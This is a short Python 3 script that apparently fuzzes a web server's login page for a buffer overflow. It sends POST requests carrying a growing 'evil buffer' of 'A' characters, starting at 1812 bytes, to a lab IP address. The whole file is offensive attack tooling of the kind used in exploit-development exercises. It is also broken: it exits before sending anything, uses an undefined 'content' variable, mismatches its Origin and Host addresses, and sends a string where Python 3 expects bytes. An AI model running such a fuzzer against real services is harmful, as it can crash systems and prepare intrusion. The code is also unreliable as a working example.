#!/usr/bin/python3

import socket
import time
import sys

size = 1812
host = "192.168.143.10"
port = 80
page = "login"

while(size < 2100):
    try:
        print("\nSending evil buffer with %s bytes" % size)

        inputBuffer = "A" * size

        print(inputBuffer)
        sys.exit()

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: " + host + "\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://" + host + "/" + page + "\r\n"
        buffer += "Origin: http://192.168.182.10\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " + str(len(content)) + "\r\n"
        buffer += "\r\n"

        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((host, port))
        print(buffer)
        s.send(buffer)

        s.close()

        size += 100
        time.sleep(10)

    except:
        print("Unable to connect to " + host + " on port " + str(port))
        sys.exit()
